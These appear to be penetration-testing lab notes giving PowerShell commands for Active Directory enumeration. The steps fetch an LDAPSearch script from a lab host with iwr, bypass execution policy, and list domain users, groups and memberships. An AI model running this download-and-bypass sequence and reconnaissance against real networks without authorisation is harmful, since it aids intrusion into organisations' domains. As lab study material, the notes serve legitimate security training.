
```powershell
iwr -uri http://192.168.100.200/OffsecLabs/ldapsearch.ps1 -Outfile C:/ProgramData/ldapsearch.ps1
```

```powershell
powershell -ep bypass
```

```powershell
Import-Module C:\ProgramData\ldapsearch.ps1
```

Enumerate all users in domain
```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```

List groups in all AD objects including _Domain Local_ groups (not just global groups)
```powershell
LDAPSearch -LDAPQuery "(objectclass=group)"
```

Enumerate every group available in the domain and display the user members
```powershell
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {$group.properties | select {$_.cn}, {$_.member}}
```

Saving a group object to variable
```powershell
$gp = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel))"
```
Saving a user object to variable
```powershell
$user = LDAPSearch -LDAPQuery "(&(objectCategory=user)(cn=michelle*))"
```

Using variable to derive properties
```powershell
$gp.properties.member
```

```powershell
$jen.properties.memberof
```